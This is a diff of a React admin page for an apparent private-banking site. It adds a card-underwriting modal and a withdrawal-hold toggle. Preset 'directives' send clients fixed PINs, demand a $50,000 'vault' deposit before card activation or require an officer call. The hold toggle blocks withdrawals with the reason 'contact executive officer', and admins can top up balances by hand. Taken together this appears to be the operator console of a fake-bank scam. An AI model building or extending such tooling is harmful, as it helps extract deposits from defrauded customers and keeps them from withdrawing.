+                <div className="grid grid-cols-3 gap-2 text-xs">
+                  <button
+                    type="button"
+                    onClick={() =>
+                      setCardUnderwriteModal((prev) => ({
+                        ...prev,
+                        decision: "approve_with_instruction",
+                      }))
+                    }
+                    className={cn(
+                      "py-2 px-2 border rounded text-center transition-all uppercase text-[10px] font-bold",
+                      cardUnderwriteModal.decision === "approve_with_instruction"
+                        ? "border-gold bg-gold/20 text-gold"
+                        : "border-border bg-navy-panel text-muted-foreground hover:text-white",
+                    )}
+                  >
+                    Approve (Require Directive)
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() =>
+                      setCardUnderwriteModal((prev) => ({
+                        ...prev,
+                        decision: "instant_activate",
+                      }))
+                    }
+                    className={cn(
+                      "py-2 px-2 border rounded text-center transition-all uppercase text-[10px] font-bold",
+                      cardUnderwriteModal.decision === "instant_activate"
+                        ? "border-emerald-500 bg-emerald-500/20 text-emerald-300"
+                        : "border-border bg-navy-panel text-muted-foreground hover:text-white",
+                    )}
+                  >
+                    Immediate Activation
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() =>
+                      setCardUnderwriteModal((prev) => ({
+                        ...prev,
+                        decision: "reject",
+                      }))
+                    }
+                    className={cn(
+                      "py-2 px-2 border rounded text-center transition-all uppercase text-[10px] font-bold",
+                      cardUnderwriteModal.decision === "reject"
+                        ? "border-red-500 bg-red-500/20 text-red-300"
+                        : "border-border bg-navy-panel text-muted-foreground hover:text-white",
+                    )}
+                  >
+                    Reject Card
+                  </button>
+                </div>
+              </div>
+
+              {/* Directive Presets if approve_with_instruction */}
+              {cardUnderwriteModal.decision === "approve_with_instruction" && (
+                <div className="space-y-2">
+                  <Label className="text-xs uppercase text-muted-foreground">Particular Instruction Presets</Label>
+                  <div className="grid grid-cols-2 gap-2 text-[11px]">
+                    <button
+                      type="button"
+                      onClick={() =>
+                        setCardUnderwriteModal((prev) => ({
+                          ...prev,
+                          instruction:
+                            "Dual-signatory executive authorization required. Enter Signatory PIN 8821 on your client dashboard to initialize card EMV chip.",
+                          pin: "8821",
+                        }))
+                      }
+                      className="border border-border bg-navy-panel p-2 rounded text-left hover:border-gold/50"
+                    >
+                      <span className="font-bold text-gold block">🔑 Security PIN Protocol</span>
+                      <span className="text-[10px] text-muted-foreground">Assign PIN 8821 for EMV chip initialization</span>
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() =>
+                        setCardUnderwriteModal((prev) => ({
+                          ...prev,
+                          instruction:
+                            "Collateral Milestone Required: Client must maintain minimum portfolio balance of $50,000 in segregated vault before card activation.",
+                          pin: "",
+                        }))
+                      }
+                      className="border border-border bg-navy-panel p-2 rounded text-left hover:border-gold/50"
+                    >
+                      <span className="font-bold text-gold block">🏛️ Collateral Milestone</span>
+                      <span className="text-[10px] text-muted-foreground">Require $50,000 vault balance</span>
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() =>
+                        setCardUnderwriteModal((prev) => ({
+                          ...prev,
+                          instruction:
+                            "Private Wealth Conference: Scheduled compliance teleconference with dedicated private wealth banker required prior to activation.",
+                          pin: "3941",
+                        }))
+                      }
+                      className="border border-border bg-navy-panel p-2 rounded text-left hover:border-gold/50"
+                    >
+                      <span className="font-bold text-gold block">📞 Compliance Call</span>
+                      <span className="text-[10px] text-muted-foreground">Officer phone conference directive</span>
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() =>
+                        setCardUnderwriteModal((prev) => ({
+                          ...prev,
+                          instruction:
+                            "Immediate sovereign clearance granted. Click complete activation on your dashboard to bring card online.",
+                          pin: "",
+                        }))
+                      }
+                      className="border border-border bg-navy-panel p-2 rounded text-left hover:border-gold/50"
+                    >
+                      <span className="font-bold text-gold block">⚡ Sovereign Clearance</span>
+                      <span className="text-[10px] text-muted-foreground">Instant self-activation clearance</span>
+                    </button>
+                  </div>
+
+                  <div className="space-y-1.5 pt-1">
+                    <Label className="text-xs uppercase text-muted-foreground">Specific Directive / Instructions Dispatched to Client</Label>
+                    <textarea
+                      rows={2}
+                      value={cardUnderwriteModal.instruction}
+                      onChange={(e) =>
+                        setCardUnderwriteModal((prev) => ({
+                          ...prev,
+                          instruction: e.target.value,
+                        }))
+                      }
+                      className="w-full rounded border border-border bg-navy-panel px-3 py-2 text-xs text-foreground font-mono focus:outline-none focus:ring-1 focus:ring-gold"
+                    />
+                  </div>
+
+                  <div className="space-y-1.5">
+                    <Label className="text-xs uppercase text-muted-foreground">Assigned Signatory PIN (Optional)</Label>
+                    <Input
+                      maxLength={8}
+                      placeholder="e.g. 8821"
+                      value={cardUnderwriteModal.pin}
+                      onChange={(e) =>
+                        setCardUnderwriteModal((prev) => ({
+                          ...prev,
+                          pin: e.target.value,
+                        }))
+                      }
+                      className="bg-navy-panel text-xs h-10 font-mono text-gold"
+                    />
+                  </div>
+                </div>
+              )}
+
+              {/* Approved Spending Limit */}
+              <div className="grid grid-cols-2 gap-3">
+                <div className="space-y-1.5">
+                  <Label className="text-xs uppercase text-muted-foreground">Approved Spending Limit (USD)</Label>
+                  <Input
+                    type="number"
+                    min="1000"
+                    step="1000"
+                    value={cardUnderwriteModal.limit}
+                    onChange={(e) =>
+                      setCardUnderwriteModal((prev) => ({
+                        ...prev,
+                        limit: Number(e.target.value),
+                      }))
+                    }
+                    className="bg-navy-panel text-xs h-10 font-mono"
+                  />
+                </div>
+                <div className="space-y-1.5">
+                  <Label className="text-xs uppercase text-muted-foreground">Internal Audit Memo</Label>
+                  <Input
+                    value={cardUnderwriteModal.note}
+                    onChange={(e) =>
+                      setCardUnderwriteModal((prev) => ({
+                        ...prev,
+                        note: e.target.value,
+                      }))
+                    }
+                    className="bg-navy-panel text-xs h-10"
+                  />
+                </div>
+              </div>
+
+              <div className="flex gap-2 pt-2 border-t border-border">
+                <Button
+                  type="button"
+                  variant="outline"
+                  onClick={() => setCardUnderwriteModal((prev) => ({ ...prev, open: false }))}
+                  className="flex-1 border-border text-muted-foreground hover:text-white h-11 text-xs uppercase"
+                >
+                  Cancel
+                </Button>
+                <Button
+                  type="button"
+                  disabled={underwriteCardMutation.isPending}
+                  onClick={() => {
+                    underwriteCardMutation.mutate({
+                      cardId: cardUnderwriteModal.card.id,
+                      decision: cardUnderwriteModal.decision,
+                      activationInstruction: cardUnderwriteModal.instruction || undefined,
+                      activationPin: cardUnderwriteModal.pin.trim() || undefined,
+                      spendingLimit: cardUnderwriteModal.limit,
+                      adminDecisionNote: cardUnderwriteModal.note || undefined,
+                    });
+                  }}
+                  className="flex-1 bg-gold text-navy-deep font-bold uppercase tracking-wider text-xs h-11 hover:bg-cream"
+                >
+                  {underwriteCardMutation.isPending && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
+                  Submit Underwriting Decision
+                </Button>
+              </div>
+            </div>
+          )}
         </DialogContent>
       </Dialog>
 
@@ -1834,6 +2628,18 @@ export default function Admin() {
           setSelectedUserId(null);
           handleOpenTopUp(uid);
         }}
+        onUnderwriteCard={(card) => {
+          setSelectedUserId(null);
+          setCardUnderwriteModal({
+            open: true,
+            card,
+            decision: "approve_with_instruction",
+            instruction: card.activationInstruction || "Dual-signatory executive authorization required. Enter Signatory PIN 8821 on your client dashboard to initialize card EMV chip.",
+            pin: card.activationPin || "8821",
+            limit: card.spendingLimit || 100000,
+            note: card.adminDecisionNote || `Underwriting review for ${card.userName || "client"}`,
+          });
+        }}
       />
     </div>
   );
@@ -1874,11 +2680,13 @@ function ClientSheet({
   onClose,
   onChanged,
   onTopUp,
+  onUnderwriteCard,
 }: {
   userId: number | null;
   onClose: () => void;
   onChanged: (msg: string) => Promise<void>;
   onTopUp: (userId: number) => void;
+  onUnderwriteCard?: (card: any) => void;
 }) {
   const detail = trpc.admin.userDetail.useQuery(
     { userId: userId ?? 0 },
@@ -1888,6 +2696,12 @@ function ClientSheet({
   const setStatus = trpc.admin.setAccountStatus.useMutation({
     onSuccess: async (_, vars) => {
       await onChanged(vars.status === "frozen" ? "Account frozen." : "Account reactivated.");
+    },
+  });
+
+  const setWithdrawalHoldMutation = trpc.admin.setAccountWithdrawalHold.useMutation({
+    onSuccess: async (_, vars) => {
+      await onChanged(vars.hold ? "Withdrawal security hold activated." : "Withdrawal hold lifted.");
     },
   });
 
@@ -1927,57 +2741,138 @@ function ClientSheet({
               </div>
 
               {acct && (
-                <div className="mt-5 border-t border-border pt-4 flex items-end justify-between">
-                  <div>
-                    <span className="text-[10px] uppercase tracking-[0.2em] text-muted-foreground">
-                      Settled Balance · Acct #{acct.accountNumber}
-                    </span>
-                    <div className="tnum mt-1 font-display text-3xl font-bold text-cream">
-                      {formatMoney(acct.balance)}
+                <>
+                  <div className="mt-5 border-t border-border pt-4 flex items-end justify-between">
+                    <div>
+                      <span className="text-[10px] uppercase tracking-[0.2em] text-muted-foreground">
+                        Settled Balance · Acct #{acct.accountNumber}
+                      </span>
+                      <div className="tnum mt-1 font-display text-3xl font-bold text-cream">
+                        {formatMoney(acct.balance)}
+                      </div>
+                    </div>
+                    <div className="flex gap-2">
+                      <Button
+                        size="sm"
+                        onClick={() => onTopUp(u.id)}
+                        className="h-9 bg-gold px-3 text-[10px] font-semibold uppercase tracking-[0.14em] text-navy-deep hover:bg-cream"
+                      >
+                        <Zap className="mr-1 h-3.5 w-3.5" />
+                        Top Up
+                      </Button>
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        disabled={setStatus.isPending}
+                        onClick={() =>
+                          setStatus.mutate({
+                            userId: u.id,
+                            status: acct.status === "active" ? "frozen" : "active",
+                          })
+                        }
+                        className="h-9 border-border text-[10px] uppercase tracking-[0.14em] text-muted-foreground hover:text-cream"
+                      >
+                        {acct.status === "active" ? <Snowflake className="h-3.5 w-3.5" /> : <Sun className="h-3.5 w-3.5" />}
+                      </Button>
                     </div>
                   </div>
-                  <div className="flex gap-2">
-                    <Button
-                      size="sm"
-                      onClick={() => onTopUp(u.id)}
-                      className="h-9 bg-gold px-3 text-[10px] font-semibold uppercase tracking-[0.14em] text-navy-deep hover:bg-cream"
-                    >
-                      <Zap className="mr-1 h-3.5 w-3.5" />
-                      Top Up
-                    </Button>
+
+                  {/* Account-Level Withdrawal Permission / Hold */}
+                  <div className="mt-4 border-t border-border pt-3 space-y-2">
+                    <div className="flex items-center justify-between text-xs">
+                      <span className="text-muted-foreground uppercase tracking-wider text-[10px]">Withdrawal Permission</span>
+                      {(acct as any).withdrawalHold ? (
+                        <span className="text-rose-400 font-bold uppercase text-[10px] bg-rose-500/10 border border-rose-500/30 px-2 py-0.5 rounded">
+                          Security Hold Active
+                        </span>
+                      ) : (
+                        <span className="text-emerald-400 font-bold uppercase text-[10px] bg-emerald-500/10 border border-emerald-500/30 px-2 py-0.5 rounded">
+                          Withdrawals Authorized
+                        </span>
+                      )}
+                    </div>
                     <Button
                       variant="outline"
                       size="sm"
-                      disabled={setStatus.isPending}
-                      onClick={() =>
-                        setStatus.mutate({
+                      disabled={setWithdrawalHoldMutation.isPending}
+                      onClick={() => {
+                        const isHolding = !(acct as any).withdrawalHold;
+                        setWithdrawalHoldMutation.mutate({
                           userId: u.id,
-                          status: acct.status === "active" ? "frozen" : "active",
-                        })
-                      }
-                      className="h-9 border-border text-[10px] uppercase tracking-[0.14em] text-muted-foreground hover:text-cream"
+                          hold: isHolding,
+                          reason: isHolding ? "Administrative compliance review active. Contact executive officer." : undefined,
+                        });
+                      }}
+                      className={cn(
+                        "w-full text-[10px] uppercase font-semibold h-8 transition-colors",
+                        (acct as any).withdrawalHold
+                          ? "border-emerald-500/50 text-emerald-300 hover:bg-emerald-500/10"
+                          : "border-rose-500/50 text-rose-300 hover:bg-rose-500/10",
+                      )}
                     >
-                      {acct.status === "active" ? <Snowflake className="h-3.5 w-3.5" /> : <Sun className="h-3.5 w-3.5" />}
+                      {(acct as any).withdrawalHold ? "✓ Lift Withdrawal Hold (Allow Outflows)" : "⛔ Place Security Hold on Withdrawals"}
                     </Button>
                   </div>
-                </div>
+                </>
               )}
             </div>
 
             {/* Linked Cards */}
             {detail.data?.cards && detail.data.cards.length > 0 && (
               <div>
-                <div className="mb-2 text-[10px] uppercase tracking-[0.2em] text-muted-foreground">
-                  Linked Metal & Virtual Cards
+                <div className="mb-2 flex items-center justify-between text-[10px] uppercase tracking-[0.2em] text-muted-foreground">
+                  <span>Linked Metal & Virtual Cards ({detail.data.cards.length})</span>
                 </div>
-                <div className="space-y-2">
+                <div className="space-y-2.5">
                   {detail.data.cards.map((c) => (
-                    <div key={c.id} className="border border-border bg-navy-panel p-3.5 flex items-center justify-between text-xs">
-                      <div>
-                        <div className="font-semibold text-foreground">{c.tier} ({c.type})</div>
-                        <div className="tnum text-muted-foreground">{c.cardNumber} · Exp {c.expiry}</div>
+                    <div key={c.id} className="border border-border bg-navy-panel p-3.5 space-y-2.5 text-xs">
+                      <div className="flex items-start justify-between">
+                        <div>
+                          <div className="font-semibold text-foreground flex items-center gap-2">
+                            <span>{c.tier}</span>
+                            <span className="text-[10px] uppercase font-mono px-1.5 py-0.5 rounded bg-navy-deep border border-border text-muted-foreground">
+                              {c.type}
+                            </span>
+                          </div>
+                          <div className="tnum text-muted-foreground font-mono mt-0.5">{c.cardNumber} · Exp {c.expiry}</div>
+                        </div>
+                        <div className="text-right">
+                          <StatusPill status={c.status} />
+                          <div className="tnum font-medium text-cream text-[11px] mt-1">{formatMoney(c.spendingLimit)} limit</div>
+                        </div>
                       </div>
-                      <span className="tnum font-medium text-cream">{formatMoney(c.spendingLimit)} limit</span>
+
+                      {(c as any).activationInstruction && (
+                        <div className="text-[11px] bg-navy-deep/80 border border-border/80 p-2 text-muted-foreground rounded space-y-1">
+                          <span className="text-gold font-semibold uppercase text-[10px] block">Active Underwriting Directive:</span>
+                          <p>{(c as any).activationInstruction}</p>
+                          {(c as any).activationPin && (
+                            <p className="text-[10px] font-mono text-cream">Signatory PIN: <span className="text-gold font-bold">{(c as any).activationPin}</span></p>
+                          )}
+                        </div>
+                      )}
+
+                      <div className="flex items-center justify-between pt-1 border-t border-border/40">
+                        <span className="text-[10px] text-muted-foreground font-mono">
+                          {(c as any).appliedAt ? `Applied ${formatDateTime((c as any).appliedAt)}` : "Standard Provisioning"}
+                        </span>
+                        <Button
+                          size="sm"
+                          variant="outline"
+                          onClick={() =>
+                            onUnderwriteCard?.({
+                              ...c,
+                              userName: u.name,
+                              userEmail: u.email,
+                              accountBalance: acct?.balance || "0",
+                              accountNumber: acct?.accountNumber || "",
+                            })
+                          }
+                          className="h-7 text-[10px] uppercase border-gold/40 text-gold hover:bg-gold hover:text-navy-deep font-semibold"
+                        >
+                          Underwrite / Directives
+                        </Button>
+                      </div>
                     </div>
                   ))}
                 </div>
